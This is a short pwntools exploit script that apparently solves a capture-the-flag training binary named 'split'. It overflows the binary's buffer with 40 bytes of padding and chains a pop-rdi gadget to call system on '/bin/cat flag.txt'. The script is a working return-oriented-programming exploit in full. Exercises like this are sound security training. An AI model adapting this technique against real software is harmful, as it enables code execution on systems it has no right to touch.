from pwn import process, p64

pop_rdi_ret  = p64(0x4007c3)    # pop rdi; ret instruction address
bin_cat_flag = p64(0x601060)    # /bin/cat flag.txt address
_system      = p64(0x40074b)    # system call address

p = process("./split")

print(p.recvuntil("> ").decode("latin-1"))

payload = b"A"*40
payload += pop_rdi_ret
payload += bin_cat_flag
payload += _system

p.sendline(payload)

print(p.clean().decode("latin-1"))

